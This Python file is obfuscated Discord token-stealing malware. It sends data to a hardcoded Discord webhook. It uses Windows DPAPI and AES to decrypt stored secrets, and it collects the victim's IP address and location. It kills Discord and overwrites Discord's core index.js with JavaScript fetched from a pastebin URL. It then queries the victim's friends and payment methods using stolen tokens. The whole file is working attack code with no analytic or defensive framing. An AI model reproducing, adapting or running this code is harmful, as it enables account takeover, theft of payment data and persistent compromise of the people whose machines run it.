import os #line:1
import threading #line:2
from sys import executable #line:3
from sqlite3 import connect as sql_connect #line:4
import re #line:5
from base64 import b64decode #line:6
from json import loads as json_loads ,load #line:7
from ctypes import windll ,wintypes ,byref ,cdll ,Structure ,POINTER ,c_char ,c_buffer #line:8
from urllib .request import Request ,urlopen #line:9
from json import *#line:10
import time #line:11
import shutil #line:12
from zipfile import ZipFile #line:13
import random #line:14
import re #line:15
import subprocess #line:16
import sys #line:17
import shutil #line:18
import uuid #line:19
import socket #line:20
import getpass #line:21
KeYv1_IOIOIoiOIOIOioIOIOIoioIOIOioIOIoioio0oioiIOOO0000ooOo0o0o00o0o0o0o0o0o0o000o0o0o0o0oo0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0 ='7c7PEK7NAArcPdSEdObVU35-3EMIa6KlomGD1E5e65ABXD6H1UbOaZ3OVdktOOzKHTH9'#line:23
Sahfv1_O0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0oo ='1113432496969891941'#line:24
IOioiOOioOIOoooIOIoioIOIOioIOioiOIOIOioIOIOIOioioIOIOIOioioIOIoioioOIOioioIOOOiooOIIIIIIIIOOi0o0i0o0ioOo0IOOIOoioiOIO00O0o0o0o0o0OOOO0o0o0oOOO0o0o0oOOO0o0o0o0OOOOo0o0o0o0oOOOo0o00ooOOOO00o0ooOOO0o0o0o0oOOO0o0o0o0OOOooo00o0oOOOo00o0ooOOoo00o0o0OOO0o0oOOO =f'https://discord.com/api/webhooks/{Sahfv1_O0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0oo}/{KeYv1_IOIOIoiOIOIOioIOIOIoioIOIOioIOIoioio0oioiIOOO0000ooOo0o0o00o0o0o0o0o0o0o000o0o0o0o0oo0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0}'#line:25
inj_url_raaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ="https://pastebin.com/raw/BsZ18N9J"#line:26
DETECTED =False #line:28
def g3t1p ():#line:30
    O0OO0OOO0O000OO0O ="None"#line:31
    try :#line:32
        O0OO0OOO0O000OO0O =urlopen (Request ("https://api.ipify.org")).read ().decode ().strip ()#line:33
    except :#line:34
        pass #line:35
    return O0OO0OOO0O000OO0O #line:36
requirements =[["requests","requests"],["Crypto.Cipher","pycryptodome"],]#line:41
for modl in requirements :#line:42
    try :__import__ (modl [0 ])#line:43
    except :#line:44
        subprocess .Popen (f"{executable} -m pip install {modl[1]}",shell =True )#line:45
        time .sleep (3 )#line:46
import requests #line:48
from Crypto .Cipher import AES #line:49
local =os .getenv ('LOCALAPPDATA')#line:51
roaming =os .getenv ('APPDATA')#line:52
temp =os .getenv ("TEMP")#line:53
Threadlist =[]#line:54
class DATA_BLOB (Structure ):#line:57
    _fields_ =[('cbData',wintypes .DWORD ),('pbData',POINTER (c_char ))]#line:61
def G3tD4t4 (OO0000O0O00OOOOOO ):#line:63
    O00OO0OOOO00O00OO =int (OO0000O0O00OOOOOO .cbData )#line:64
    O0000O000O00O00OO =OO0000O0O00OOOOOO .pbData #line:65
    OO0O0OOOO0OO0O000 =c_buffer (O00OO0OOOO00O00OO )#line:66
    cdll .msvcrt .memcpy (OO0O0OOOO0OO0O000 ,O0000O000O00O00OO ,O00OO0OOOO00O00OO )#line:67
    windll .kernel32 .LocalFree (O0000O000O00O00OO )#line:68
    return OO0O0OOOO0OO0O000 .raw #line:69
def CryptUnprotectData (O00O0O0OO0OOOO0OO ,entropy =b''):#line:71
    O00O0O0O000O0OO0O =c_buffer (O00O0O0OO0OOOO0OO ,len (O00O0O0OO0OOOO0OO ))#line:72
    O000OOO0O0OOO000O =c_buffer (entropy ,len (entropy ))#line:73
    OOO0O0000O0O0OOOO =DATA_BLOB (len (O00O0O0OO0OOOO0OO ),O00O0O0O000O0OO0O )#line:74
    OO0O00O00OOO0OO00 =DATA_BLOB (len (entropy ),O000OOO0O0OOO000O )#line:75
    O0OOO0000OO00O00O =DATA_BLOB ()#line:76
    if windll .crypt32 .CryptUnprotectData (byref (OOO0O0000O0O0OOOO ),None ,byref (OO0O00O00OOO0OO00 ),None ,None ,0x01 ,byref (O0OOO0000OO00O00O )):#line:78
        return G3tD4t4 (O0OOO0000OO00O00O )#line:79
def D3kryptV4lU3 (OO0OOOOO00O0OO0O0 ,master_key =None ):#line:81
    OO00O0OOO000O00OO =OO0OOOOO00O0OO0O0 .decode (encoding ='utf8',errors ='ignore')[:3 ]#line:82
    if OO00O0OOO000O00OO =='v10'or OO00O0OOO000O00OO =='v11':#line:83
        OO000OOOOO0000OOO =OO0OOOOO00O0OO0O0 [3 :15 ]#line:84
        OO0OOO000O00OOO00 =OO0OOOOO00O0OO0O0 [15 :]#line:85
        OOOOOO000OO0OOO0O =AES .new (master_key ,AES .MODE_GCM ,OO000OOOOO0000OOO )#line:86
        O0000OOO0OOO000O0 =OOOOOO000OO0OOO0O .decrypt (OO0OOO000O00OOO00 )#line:87
        O0000OOO0OOO000O0 =O0000OOO0OOO000O0 [:-16 ].decode ()#line:88
        return O0000OOO0OOO000O0 #line:89
def L04dR3qu3sTs (OO00O0OO00OOO0OOO ,O00O0OOOOOO00O00O ,data ='',files ='',headers =''):#line:91
    for OOO0O0OOOO0OOO0O0 in range (8 ):#line:92
        try :#line:93
            if OO00O0OO00OOO0OOO =='POST':#line:94
                if data !='':#line:95
                    OO0O0000O00O000O0 =requests .post (O00O0OOOOOO00O00O ,data =data )#line:96
                    if OO0O0000O00O000O0 .status_code ==200 :#line:97
                        return OO0O0000O00O000O0 #line:98
                elif files !='':#line:99
                    OO0O0000O00O000O0 =requests .post (O00O0OOOOOO00O00O ,files =files )#line:100
                    if OO0O0000O00O000O0 .status_code ==200 or OO0O0000O00O000O0 .status_code ==413 :#line:101
                        return OO0O0000O00O000O0 #line:102
        except :#line:103
            pass #line:104
def L04durl1b (O0O0O0O0O0O0000O0 ,data ='',files ='',headers =''):#line:106
    for OOOO00OOOO0OOOOO0 in range (8 ):#line:107
        try :#line:108
            if headers !='':#line:109
                O00O0OOO0O0O00OOO =urlopen (Request (O0O0O0O0O0O0000O0 ,data =data ,headers =headers ))#line:110
                return O00O0OOO0O0O00OOO #line:111
            else :#line:112
                O00O0OOO0O0O00OOO =urlopen (Request (O0O0O0O0O0O0000O0 ,data =data ))#line:113
                return O00O0OOO0O0O00OOO #line:114
        except :#line:115
            pass #line:116
def globalInfo ():#line:118
    O0O000O00OOOOO0O0 =g3t1p ()#line:119
    O0O000OOO0OOOO00O =os .getenv ("USERNAME")#line:120
    O0OOOOO0O0O0O0O0O =urlopen (Request (f"https://geolocation-db.com/jsonp/{O0O000O00OOOOO0O0}")).read ().decode ().replace ('callback(','').replace ('})','}')#line:121
    OOOO00O00OOO0O0O0 =loads (O0OOOOO0O0O0O0O0O )#line:122
    O0OOOO0OOO0O0O0O0 =OOOO00O00OOO0O0O0 ["country_name"]#line:123
    O00OOOO00OOO0O00O =OOOO00O00OOO0O0O0 ["country_code"].lower ()#line:124
    O0O0OOO0O00O0OOO0 =OOOO00O00OOO0O0O0 ["state"]#line:125
    OO0O00OO0OOO0O0OO =f":flag_{O00OOOO00OOO0O00O}:  - `{O0O000OOO0OOOO00O.upper()} | {O0O000O00OOOOO0O0} ({O0OOOO0OOO0O0O0O0})`"#line:127
    return OO0O00OO0OOO0O0OO #line:128
def TR6st (O00000OO00OOO0OO0 ):#line:131
    global DETECTED #line:132
    O0OOO0OOO00OOO0OO =str (O00000OO00OOO0OO0 )#line:133
    OOOO00OOOO0OO00O0 =re .findall (".google.com",O0OOO0OOO00OOO0OO )#line:134
    if len (OOOO00OOOO0OO00O0 )<-1 :#line:135
        DETECTED =True #line:136
        return DETECTED #line:137
    else :#line:138
        DETECTED =False #line:139
        return DETECTED #line:140
def G3tUHQFr13ndS (OOOOOO0O0O0OO0O00 ):#line:142
    OO0000O0000OO0OO0 =[{"Name":'Early_Verified_Bot_Developer','Value':131072 ,'Emoji':"<:developer:874750808472825986> "},{"Name":'Bug_Hunter_Level_2','Value':16384 ,'Emoji':"<:bughunter_2:874750808430874664> "},{"Name":'Early_Supporter','Value':512 ,'Emoji':"<:early_supporter:874750808414113823> "},{"Name":'House_Balance','Value':256 ,'Emoji':"<:balance:874750808267292683> "},{"Name":'House_Brilliance','Value':128 ,'Emoji':"<:brilliance:874750808338608199> "},{"Name":'House_Bravery','Value':64 ,'Emoji':"<:bravery:874750808388952075> "},{"Name":'Bug_Hunter_Level_1','Value':8 ,'Emoji':"<:bughunter_1:874750808426692658> "},{"Name":'HypeSquad_Events','Value':4 ,'Emoji':"<:hypesquad_events:874750808594477056> "},{"Name":'Partnered_Server_Owner','Value':2 ,'Emoji':"<:partner:874750808678354964> "},{"Name":'Discord_Employee','Value':1 ,'Emoji':"<:staff:874750808728666152> "}]#line:154
    OO0O0O00OO0OOOOOO ={"Authorization":OOOOOO0O0O0OO0O00 ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:159
    try :#line:160
        OO000O0OO00O0OOOO =loads (urlopen (Request ("https://discord.com/api/v6/users/@me/relationships",headers =OO0O0O00OO0OOOOOO )).read ().decode ())#line:161
    except :#line:162
        return False #line:163
    OOOOOOOO00OOOOO00 =''#line:165
    for O0OO00O00OO00OOO0 in OO000O0OO00O0OOOO :#line:166
        OOO00OOOOOOO0000O =''#line:167
        OOOOO000O00O0O00O =O0OO00O00OO00OOO0 ['user']['public_flags']#line:168
        for O0OO0OO0O0000000O in OO0000O0000OO0OO0 :#line:169
            if OOOOO000O00O0O00O //O0OO0OO0O0000000O ["Value"]!=0 and O0OO00O00OO00OOO0 ['type']==1 :#line:170
                if not "House"in O0OO0OO0O0000000O ["Name"]:#line:171
                    OOO00OOOOOOO0000O +=O0OO0OO0O0000000O ["Emoji"]#line:172
                OOOOO000O00O0O00O =OOOOO000O00O0O00O %O0OO0OO0O0000000O ["Value"]#line:173
        if OOO00OOOOOOO0000O !='':#line:174
            OOOOOOOO00OOOOO00 +=f"{OOO00OOOOOOO0000O} | {O0OO00O00OO00OOO0['user']['username']}#{O0OO00O00OO00OOO0['user']['discriminator']} ({O0OO00O00OO00OOO0['user']['id']})\n"#line:175
    return OOOOOOOO00OOOOO00 #line:176
process_list =os .popen ('tasklist').readlines ()#line:179
for process in process_list :#line:182
    if "Discord"in process :#line:183
        pid =int (process .split ()[1 ])#line:185
        os .system (f"taskkill /F /PID {pid}")#line:186
def G3tb1ll1ng (O000O00OOOOOO0OOO ):#line:188
    O0OO0O00O0O0O00O0 ={"Authorization":O000O00OOOOOO0OOO ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:193
    try :#line:194
        O0O00OOO00O0000O0 =loads (urlopen (Request ("https://discord.com/api/users/@me/billing/payment-sources",headers =O0OO0O00O0O0O00O0 )).read ().decode ())#line:195
    except :#line:196
        return False #line:197
    if O0O00OOO00O0000O0 ==[]:return "```None```"#line:199
    OO000O00OO0O00OOO =""#line:201
    for O0O000OOO0OO00O00 in O0O00OOO00O0000O0 :#line:202
        if O0O000OOO0OO00O00 ["invalid"]==False :#line:203
            if O0O000OOO0OO00O00 ["type"]==1 :#line:204
                OO000O00OO0O00OOO +=":credit_card:"#line:205
            elif O0O000OOO0OO00O00 ["type"]==2 :#line:206
                OO000O00OO0O00OOO +=":parking: "#line:207
    return OO000O00OO0O00OOO #line:209
def keywork ():#line:212
    O000OOO0O00O0O0O0 =os .getlogin ()#line:214
    O00O000000O00000O =['Discord','DiscordCanary','DiscordPTB','DiscordDevelopment']#line:216
    for OOOO00OOO00O0OO0O in O00O000000O00000O :#line:218
        O00OOO00O0OO0000O =os .path .join (os .getenv ('LOCALAPPDATA'),OOOO00OOO00O0OO0O )#line:219
        if os .path .isdir (O00OOO00O0OO0000O ):#line:220
            for O0O0O0O000OOOOO00 ,O000OOOOO0O0O00OO ,OOOO00OO0O0000OO0 in os .walk (O00OOO00O0OO0000O ):#line:221
                if 'app-'in O0O0O0O000OOOOO00 :#line:222
                    for OO000OOO00O00O0OO in O000OOOOO0O0O00OO :#line:223
                        if 'modules'in OO000OOO00O00O0OO :#line:224
                            O0O000O0OOO0O0O0O =os .path .join (O0O0O0O000OOOOO00 ,OO000OOO00O00O0OO )#line:225
                            for OOOOOOO0OO000OOOO ,O0OO0O0O000000O0O ,OO000OO00OO000OO0 in os .walk (O0O000O0OOO0O0O0O ):#line:226
                                if 'discord_desktop_core-'in OOOOOOO0OO000OOOO :#line:227
                                    for OOOOOOOO0000O00OO ,OOO0O000O0O0O0O00 ,OO00O0OO0OO0O0OO0 in os .walk (OOOOOOO0OO000OOOO ):#line:228
                                        if 'discord_desktop_core'in OOOOOOOO0000O00OO :#line:229
                                            for O000OOOOOOOO0OOOO in OO00O0OO0OO0O0OO0 :#line:230
                                                if O000OOOOOOOO0OOOO =='index.js':#line:231
                                                    OO0OO00O00OO00OOO =os .path .join (OOOOOOOO0000O00OO ,O000OOOOOOOO0OOOO )#line:232
                                                    O0O0O0OOOO0OOO0OO =requests .get (inj_url_raaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ).text #line:234
                                                    O0O0O0OOOO0OOO0OO =O0O0O0OOOO0OOO0OO .replace ("%WEBHOOK%",IOioiOOioOIOoooIOIoioIOIOioIOioiOIOIOioIOIOIOioioIOIOIOioioIOIoioioOIOioioIOOOiooOIIIIIIIIOOi0o0i0o0ioOo0IOOIOoioiOIO00O0o0o0o0o0OOOO0o0o0oOOO0o0o0oOOO0o0o0o0OOOOo0o0o0o0oOOOo0o00ooOOOO00o0ooOOO0o0o0o0oOOO0o0o0o0OOOooo00o0oOOOo00o0ooOOoo00o0o0OOO0o0oOOO )#line:236
                                                    with open (OO0OO00O00OO00OOO ,"w",encoding ="utf-8")as OOO00OO0O000O00O0 :#line:238
                                                        OOO00OO0O000O00O0 .write (O0O0O0OOOO0OOO0OO )#line:239
keywork ()#line:240
def G3tB4dg31 (O0O0OO0OO00O0O00O ):#line:242
    if O0O0OO0OO00O0O00O ==0 :return ''#line:243
    O00OOO0O0OOOO000O =''#line:245
    O0OOOO000000O0OOO =[{"Name":'Early_Verified_Bot_Developer','Value':131072 ,'Emoji':"<:developer:874750808472825986> "},{"Name":'Bug_Hunter_Level_2','Value':16384 ,'Emoji':"<:bughunter_2:874750808430874664> "},{"Name":'Early_Supporter','Value':512 ,'Emoji':"<:early_supporter:874750808414113823> "},{"Name":'House_Balance','Value':256 ,'Emoji':"<:balance:874750808267292683> "},{"Name":'House_Brilliance','Value':128 ,'Emoji':"<:brilliance:874750808338608199> "},{"Name":'House_Bravery','Value':64 ,'Emoji':"<:bravery:874750808388952075> "},{"Name":'Bug_Hunter_Level_1','Value':8 ,'Emoji':"<:bughunter_1:874750808426692658> "},{"Name":'HypeSquad_Events','Value':4 ,'Emoji':"<:hypesquad_events:874750808594477056> "},{"Name":'Partnered_Server_Owner','Value':2 ,'Emoji':"<:partner:874750808678354964> "},{"Name":'Discord_Employee','Value':1 ,'Emoji':"<:staff:874750808728666152> "}]#line:257
    for O0O0OOO00O0000OO0 in O0OOOO000000O0OOO :#line:258
        if O0O0OO0OO00O0O00O //O0O0OOO00O0000OO0 ["Value"]!=0 :#line:259
            O00OOO0O0OOOO000O +=O0O0OOO00O0000OO0 ["Emoji"]#line:260
            O0O0OO0OO00O0O00O =O0O0OO0OO00O0O00O %O0O0OOO00O0000OO0 ["Value"]#line:261
    return O00OOO0O0OOOO000O #line:263
def G3tT0k4n1nf9 (OO00000O0000O0O00 ):#line:265
    OOOO0OO00O0OO00OO ={"Authorization":OO00000O0000O0O00 ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:270
    OO0000OO00OOOOOOO =loads (urlopen (Request ("https://discordapp.com/api/v6/users/@me",headers =OOOO0OO00O0OO00OO )).read ().decode ())#line:272
    O0OOOOO00OOOO0OOO =OO0000OO00OOOOOOO ["username"]#line:273
